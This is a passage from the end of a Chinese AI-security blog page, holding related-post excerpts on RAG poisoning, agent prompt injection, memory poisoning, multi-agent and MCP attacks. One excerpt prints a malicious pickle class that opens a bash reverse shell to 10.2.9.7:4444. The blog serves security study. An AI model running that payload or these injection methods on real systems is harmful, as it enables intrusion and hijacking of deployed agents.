text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">RAG攻击面：你的知识库是安全的吗</div></div><div class="info-2"><div class="info-item-1">RAG 的价值是把模型不知道的私有内容接进来。攻击视角同样成立：检索管道把知识库里和问题最相近的原文，不加转换地送进模型上下文。谁能往知识库里写一条记录，谁就能决定未来某类问题的回答内容；谁能看到检索结果，谁就能拿到比模型输出更完整的原文。 这篇文章按数据流写：入库、检索、拼装、引用，每一段的攻击面和对应请求。 先看管道里每一步暴露什么    环节 关键参数 攻击关注点    入库 上传接口、同步来源 写权限给到了谁，外源文档是否进库   切片&#x2F;嵌入 chunk_size、overlap 一条毒记录需要多大，能否跨片重组   向量库 端口、API 是否未授权导出，metadata 过滤能否绕过   检索 score_threshold、top_k、rerank 阈值多少，能不能把某条记录挤进 top-k   拼装&#x2F;引用 sources 返回策略 原文片段是否直接回给前端   004 里已经写过阈值探测和 sources 泄漏，这篇集中在另外两块：把内容写进去，以及让写进去的内容被检索到。 入库的四个通道投毒的前提是写入。企业知识库的写入口通常不止一个，评估时按...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/09/30/RAG%E6%94%BB%E5%87%BB%E9%9D%A2-%E4%BD%A0%E7%9A%84%E7%9F%A5%E8%AF%86%E5%BA%93%E6%98%AF%E5%AE%89%E5%85%A8%E7%9A%84%E5%90%97/" title="RAG攻击面：你的知识库是安全的吗"><img class="cover" src="/img/avatar-oss.jpeg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-09-30</div><div class="info-item-2">RAG攻击面：你的知识库是安全的吗</div></div><div class="info-2"><div class="info-item-1">RAG 的价值是把模型不知道的私有内容接进来。攻击视角同样成立：检索管道把知识库里和问题最相近的原文，不加转换地送进模型上下文。谁能往知识库里写一条记录，谁就能决定未来某类问题的回答内容；谁能看到检索结果，谁就能拿到比模型输出更完整的原文。 这篇文章按数据流写：入库、检索、拼装、引用，每一段的攻击面和对应请求。 先看管道里每一步暴露什么    环节 关键参数 攻击关注点    入库 上传接口、同步来源 写权限给到了谁，外源文档是否进库   切片&#x2F;嵌入 chunk_size、overlap 一条毒记录需要多大，能否跨片重组   向量库 端口、API 是否未授权导出，metadata 过滤能否绕过   检索 score_threshold、top_k、rerank 阈值多少，能不能把某条记录挤进 top-k   拼装&#x2F;引用 sources 返回策略 原文片段是否直接回给前端   004 里已经写过阈值探测和 sources 泄漏，这篇集中在另外两块：把内容写进去，以及让写进去的内容被检索到。 入库的四个通道投毒的前提是写入。企业知识库的写入口通常不止一个，评估时按...</div></div></div></a><a class="pagination-related" href="/2026/09/22/%E5%A6%82%E4%BD%95%E6%94%BB%E5%87%BB%E5%8D%95%E4%B8%AAAgent%E7%B3%BB%E7%BB%9F/" title="如何攻击单个Agent系统"><img class="cover" src="/img/avatar-oss-2.jpeg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-09-22</div><div class="info-item-2">如何攻击单个Agent系统</div></div><div class="info-2"><div class="info-item-1">和 Chatbot 相比，Agent 多出来的不只是「能调用工具」，还有一个更隐蔽的变化——决策链变长了。用户的问题会走这条链：意图识别 → 工具选择 → 参数构造 → 工具执行 → 结果回读 → 结果整合 → 回答用户。 这条链条上每一步都在用 LLM 做判断。攻击的着眼点因此变化：Chatbot 场景你要骗的是「模型的输出」，Agent 场景你要骗的是**「模型的决策」**——让它选错工具、拼错参数、把不可信数据当成可信指令。 而且 Agent 天然持有一套服务侧凭证：数据库连接串、内部 API 的 Bearer Token、文件系统的账号。普通用户拿不到的东西，Agent 都拿得到。把 Agent 骗过去，等于把服务权限转嫁给了攻击者。 这就是传统安全里 Confused Deputy（被滥用的合法代理人）问题在 AI 时代的翻版。 这篇文章把单 Agent 的攻击面按这条链路的位置拆开：枚举、决策阶段的提示注入、工具输出注入、参数注入、输出侧的利用。最后给出对应的防御设计。 一、Agent 架构的攻击面从哪来一个跑在 FastAPI 后面的典型企业内部 Agent，用户请...</div></div></div></a><a class="pagination-related" href="/2026/09/26/Agent%E8%AE%B0%E5%BF%86%E6%8A%95%E6%AF%92-%E8%B7%A8%E4%BC%9A%E8%AF%9D%E7%9A%84%E9%9A%90%E6%80%A7%E5%90%8E%E9%97%A8/" title="Agent记忆投毒：跨会话的隐性后门"><img class="cover" src="/img/avatar-oss.jpeg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-09-26</div><div class="info-item-2">Agent记忆投毒：跨会话的隐性后门</div></div><div class="info-2"><div class="info-item-1">次提示注入有个硬限制：会话一结束，上下文就没了。下一次对话，模型看不到上一次塞进去的指令。 Agent 的长期记忆把这个限制拆掉了。它会把「用户说过的话」「解决过的问题」「总结出来的偏好」写进向量库或键值存储，下次相关问题时再检索回来，拼进系统提示词旁边。写入和触发可以隔着几天、换一个用户。审计日志里看不到同一条请求同时包含 payload 和危害动作。 这篇文章只讲记忆这一层：记忆存在哪、什么时候写入、检索怎么把毒记录捞回来、以及为什么常规的输入过滤几乎抓不到它。 记忆不是一段聊天记录生产里的 Agent 记忆通常是三层，不是一个叫 memory 的字段。     层 存活范围 典型内容 投毒后的影响面    会话记忆 当前 session_id 最近若干轮消息 只影响这次对话，多轮渐进用的就是这一层   用户记忆 同一 user_id，跨会话 偏好、角色、历史结论 这个人以后每次打开助手都会被带上   共享记忆 一个租户或一个 Agent 全局 「已知问题 &#x2F; 已验证修复」 任何人问到相近话题都会检索到   三层的信任级别经常被写成一样。检索回来的文本直接拼在系统提...</div></div></div></a><a class="pagination-related" href="/2026/09/28/%E6%94%BB%E5%87%BB%E5%A4%9AAgent%E7%B3%BB%E7%BB%9F-%E5%BD%93Agent%E4%B9%8B%E9%97%B4%E5%BC%80%E5%A7%8B%E5%AF%B9%E8%AF%9D/" title="攻击多Agent系统：当Agent之间开始对话"><img class="cover" src="/img/avatar-oss-2.jpeg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-09-28</div><div class="info-item-2">攻击多Agent系统：当Agent之间开始对话</div></div><div class="info-2"><div class="info-item-1">单个 Agent 被注入，影响范围是它自己的工具权限。多个 Agent 串起来之后，多出来的是信任关系：上游的输出会变成下游的输入，编排器会把某段自然语言当成「这一步已经通过」。 攻击者要找的不再只是一句能改写系统提示词的话，而是这三件事里的任意一件。  谁在调度，调度依据是当前问题，还是连同历史一起看。 每个 Agent 怎么被发现，发现信息能不能被换成攻击者的地址。 Agent 共同读取的那份数据，是不是谁都能写。  这篇文章按这个顺序写：编排模式、Agent Card 枚举、工作流步骤绕过、流氓注册、Card 地址欺骗、共享数据投毒。 四种编排，四种信任失败    模式 数据怎么流 失败方式    Orchestrator 中心节点选下一个 Agent 调度提示词被改写，某一步从计划里消失   Peer-to-Peer Agent 互相调用 一个被控节点把指令传给所有对等节点   Hierarchical 上层汇总下层 下层回传被当成已核实事实   Pipeline A 的输出是 B 的输入 载荷在前面写入，在后面的高权限步骤执行   主流框架把这些做成了默认能力，安全边界...</div></div></div></a><a class="pagination-related" href="/2026/10/04/AI%E4%BE%9B%E5%BA%94%E9%93%BE%E6%94%BB%E5%87%BB-%E4%BB%8E%E6%A8%A1%E5%9E%8B%E6%96%87%E4%BB%B6%E5%88%B0%E4%BE%9D%E8%B5%96%E5%8C%85%E7%9A%84%E4%BF%A1%E4%BB%BB%E5%8D%B1%E6%9C%BA/" title="AI供应链攻击：从模型文件到依赖包的信任危机"><img class="cover" src="/img/avatar-oss.jpeg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-10-04</div><div class="info-item-2">AI供应链攻击：从模型文件到依赖包的信任危机</div></div><div class="info-2"><div class="info-item-1">传统供应链攻击的落点是「代码」。AI 栈把它扩成了一个更模糊的问题：哪些文件会被「执行」。 .py 当然会；.pt 模型文件会；adapter.safetensors 不会执行代码，但会改变模型输出；tokenizer.json 只是两张映射表，改动两个整数就能让分类器失效。 这篇按「被执行的程度」从高到低写：pickle 反序列化、扫描器绕过、LoRA 投毒、tokenizer 操纵、依赖混淆。每一段给出可复现的最小代码和对应防御。 一、.pt 文件是代码，不是权重PyTorch 默认格式 .pt 底层是 Python pickle。pickle 的设计目标之一就是序列化「任意对象」，加载时执行构造指令。构造 RCE 不需要漏洞： 1234567import torch, osclass RevShell:    def __reduce__(self):        return (os.system, (&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.2.9.7/4444 0&gt;&amp;1&#x27;&quot;,...</div></div></div></a><a class="pagination-related" href="/2026/09/21/MCP%E6%9A%B4%E9%9C%B2%E9%9D%A2%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98-%E4%BB%8E%E5%8F%91%E7%8E%B0%E5%88%B0%E5%88%A9%E7%94%A8/" title="MCP暴露面的安全问题：从发现到利用"><img class="cover" src="/img/avatar-oss.jpeg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-09-21</div><div class="info-item-2">MCP暴露面的安全问题：从发现到利用</div></div><div class="info-2"><div class="info-item-1">MCP（Model Context Protocol）是 Anthropic 在 2024 年底推出的开放协议，目标是让 LLM 能以标准化方式连接外部工具、数据库和服务。一年内已有数千个 MCP Server 实现，覆盖从数据库查询到 Kubernetes 操作的各类能力。 但 MCP 的设计起点是「方便接入」，不是「安全部署」。规范没有强制认证，工具列表是公开的能力清单，资源 URI 直接暴露内部路径——这些设计选择让 MCP Server 的暴露面比传统 HTTP API 大得多。 这篇文章把 MCP 的暴露面拆开：先看协议设计带来了哪些天然的攻击面，然后走一条完整的攻击链，最后给出具体的修复建议。 MCP 协议是什么MCP 基于 JSON-RPC 2.0，定义了 Client 与 Server 之间的通信方式。Server 暴露三类能力：  Tools：LLM 可调用的函数，如 run_sql_query、deploy_to_k8s、send_email Resources：可读取的数据，如文件内容、数据库记录 Prompts：预定义的提示词模板  传输层经历了三代演进，...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Cr4at0r</div><div class="author-info-description">欢迎来到Cr4at0r的博客</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E5%90%91%E9%87%8F%E5%BA%93%E5%B8%B8%E5%B8%B8%E6%98%AF%E8%83%BD%E7%9B%B4%E6%8E%A5%E8%AF%BB%E7%9A%84"><span class="toc-number">1.</span> <span class="toc-text">第一步：向量库常常是能直接读的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E8%AE%A4%E5%87%BA%E7%94%9F%E6%88%90%E8%BF%99%E4%BA%9B%E5%90%91%E9%87%8F%E7%9A%84%E6%A8%A1%E5%9E%8B"><span class="toc-number">2.</span> <span class="toc-text">第二步：认出生成这些向量的模型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E5%88%86%E8%AF%8A%E2%80%94%E2%80%94%E5%85%88%E6%8C%91%E5%87%BA%E5%80%BC%E5%BE%97%E8%BF%98%E5%8E%9F%E7%9A%84"><span class="toc-number">3.</span> <span class="toc-text">第三步：分诊——先挑出值得还原的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E8%BF%98%E5%8E%9F%E5%8E%9F%E6%96%87%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-number">4.</span> <span class="toc-text">第四步：还原原文的两种方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E6%A8%A1%E6%9D%BF-%E6%88%90%E5%91%98%E6%8E%A8%E6%96%AD"><span class="toc-number">4.1.</span> <span class="toc-text">方法一：模板 + 成员推断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E8%BF%AD%E4%BB%A3%E9%87%8D%E5%BB%BA"><span class="toc-number">4.2.</span> <span class="toc-text">方法二：迭代重建</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%9D%A1%E4%BB%B6%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="toc-number">5.</span> <span class="toc-text">攻击条件与防御</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/10/07/AI%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%AE%89%E5%85%A8-%E4%BA%91-%E5%AE%B9%E5%99%A8%E4%B8%8EGPU%E9%80%83%E9%80%B8/" title="AI基础设施安全：云、容器与GPU逃逸"><img src="/img/avatar-oss-2.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AI基础设施安全：云、容器与GPU逃逸"/></a><div class="content"><a class="title" href="/2026/10/07/AI%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%AE%89%E5%85%A8-%E4%BA%91-%E5%AE%B9%E5%99%A8%E4%B8%8EGPU%E9%80%83%E9%80%B8/" title="AI基础设施安全：云、容器与GPU逃逸">AI基础设施安全：云、容器与GPU逃逸</a><time datetime="2026-10-06T16:00:00.000Z" title="发表于 2026-10-07 00:00:00">2026-10-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/10/04/AI%E4%BE%9B%E5%BA%94%E9%93%BE%E6%94%BB%E5%87%BB-%E4%BB%8E%E6%A8%A1%E5%9E%8B%E6%96%87%E4%BB%B6%E5%88%B0%E4%BE%9D%E8%B5%96%E5%8C%85%E7%9A%84%E4%BF%A1%E4%BB%BB%E5%8D%B1%E6%9C%BA/" title="AI供应链攻击：从模型文件到依赖包的信任危机"><img src="/img/avatar-oss.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AI供应链攻击：从模型文件到依赖包的信任危机"/></a><div class="content"><a class="title" href="/2026/10/04/AI%E4%BE%9B%E5%BA%94%E9%93%BE%E6%94%BB%E5%87%BB-%E4%BB%8E%E6%A8%A1%E5%9E%8B%E6%96%87%E4%BB%B6%E5%88%B0%E4%BE%9D%E8%B5%96%E5%8C%85%E7%9A%84%E4%BF%A1%E4%BB%BB%E5%8D%B1%E6%9C%BA/" title="AI供应链攻击：从模型文件到依赖包的信任危机">AI供应链攻击：从模型文件到依赖包的信任危机</a><time datetime="2026-10-03T16:00:00.000Z" title="发表于 2026-10-04 00:00:00">2026-10-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/10/03/%E5%B5%8C%E5%85%A5%E5%90%91%E9%87%8F%E6%94%BB%E5%87%BB-%E4%BB%8E%E5%90%91%E9%87%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%8D%E6%8E%A8%E5%8E%9F%E6%96%87/" title="嵌入向量攻击：从向量数据库反推原文"><img src="/img/avatar-oss-2.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="嵌入向量攻击：从向量数据库反推原文"/></a><div class="content"><a class="title" href="/2026/10/03/%E5%B5%8C%E5%85%A5%E5%90%91%E9%87%8F%E6%94%BB%E5%87%BB-%E4%BB%8E%E5%90%91%E9%87%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%8D%E6%8E%A8%E5%8E%9F%E6%96%87/" title="嵌入向量攻击：从向量数据库反推原文">嵌入向量攻击：从向量数据库反推原文</a><time datetime="2026-10-02T16:00:00.000Z" title="发表于 2026-10-03 00:00:00">2026-10-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/09/30/RAG%E6%94%BB%E5%87%BB%E9%9D%A2-%E4%BD%A0%E7%9A%84%E7%9F%A5%E8%AF%86%E5%BA%93%E6%98%AF%E5%AE%89%E5%85%A8%E7%9A%84%E5%90%97/" title="RAG攻击面：你的知识库是安全的吗"><img src="/img/avatar-oss.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="RAG攻击面：你的知识库是安全的吗"/></a><div class="content"><a class="title" href="/2026/09/30/RAG%E6%94%BB%E5%87%BB%E9%9D%A2-%E4%BD%A0%E7%9A%84%E7%9F%A5%E8%AF%86%E5%BA%93%E6%98%AF%E5%AE%89%E5%85%A8%E7%9A%84%E5%90%97/" title="RAG攻击面：你的知识库是安全的吗">RAG攻击面：你的知识库是安全的吗</a><time datetime="2026-09-29T16:00:00.000Z" title="发表于 2026-09-30 00:00:00">2026-09-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/09/28/%E6%94%BB%E5%87%BB%E5%A4%9AAgent%E7%B3%BB%E7%BB%9F-%E5%BD%93Agent%E4%B9%8B%E9%97%B4%E5%BC%80%E5%A7%8B%E5%AF%B9%E8%AF%9D/" title="攻击多Agent系统：当Agent之间开始对话"><img src="/img/avatar-oss-2.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="攻击多Agent系统：当Agent之间开始对话"/></a><div class="content"><a class="title" href="/2026/09/28/%E6%94%BB%E5%87%BB%E5%A4%9AAgent%E7%B3%BB%E7%BB%9F-%E5%BD%93Agent%E4%B9%8B%E9%97%B4%E5%BC%80%E5%A7%8B%E5%AF%B9%E8%AF%9D/" title="攻击多Agent系统：当Agent之间开始对话">攻击多Agent系统：当Agent之间开始对话</a><time datetime="2026-09-27T16:00:00.000Z" title="发表于 2026-09-28 00:00:00">2026-09-28</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Cr4at0r</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.7.0</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.7.0"></script><script src="/js/main.js?v=5.7.0"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
